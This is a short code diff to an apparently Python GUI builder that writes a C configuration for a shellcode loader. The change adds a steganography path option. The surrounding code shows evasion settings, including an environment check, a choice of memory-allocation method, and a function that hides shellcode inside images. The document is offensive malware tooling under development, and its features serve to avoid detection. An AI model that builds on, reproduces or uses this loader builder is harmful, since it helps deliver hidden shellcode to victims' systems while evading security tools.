@@ -180,6 +180,7 @@ static BOOLEAN trick_SxInDll = {sx_trick};
 static AllocateMethod allocateMethod = {alloc_method};
 static BOOLEAN checkVXQQ = {check_VXQQ};
 static BOOLEAN EnableSteg = {enable_steg};
+static wchar_t const* stegPath = L"\\\\{steg_path}";
 // ==================== CONFIG END ==========================
 '''
         config_content = config_template.format(
@@ -193,7 +194,8 @@ static BOOLEAN EnableSteg = {enable_steg};
             sx_trick='TRUE' if settings['sx_trick'] else 'FALSE',
             check_VXQQ='TRUE' if settings['check_VXQQ'] else 'FALSE',
             alloc_method=settings['alloc_method'],
-            enable_steg='TRUE' if settings['enable_steg'] else 'FALSE'
+            enable_steg='TRUE' if settings['enable_steg'] else 'FALSE',
+            steg_path=settings['steg_path'] if settings['steg_path'] else ""
         )
 
         with open(self.config_path, 'w') as f:
@@ -212,7 +214,8 @@ static BOOLEAN EnableSteg = {enable_steg};
             'sx_trick': window.sx_trick_check.isChecked(),
             'check_VXQQ': window.vxqq_check.isChecked(),
             'alloc_method': window.alloc_combo.currentText(),
-            'enable_steg': window.steg_check.isChecked()
+            'enable_steg': window.steg_check.isChecked(),
+            'steg_path': window.steg_name.text()  # 新增
         }
     def steg_shellcode_to_image(self, shellcode_data, output_path, input_image=None):
         from PIL import Image
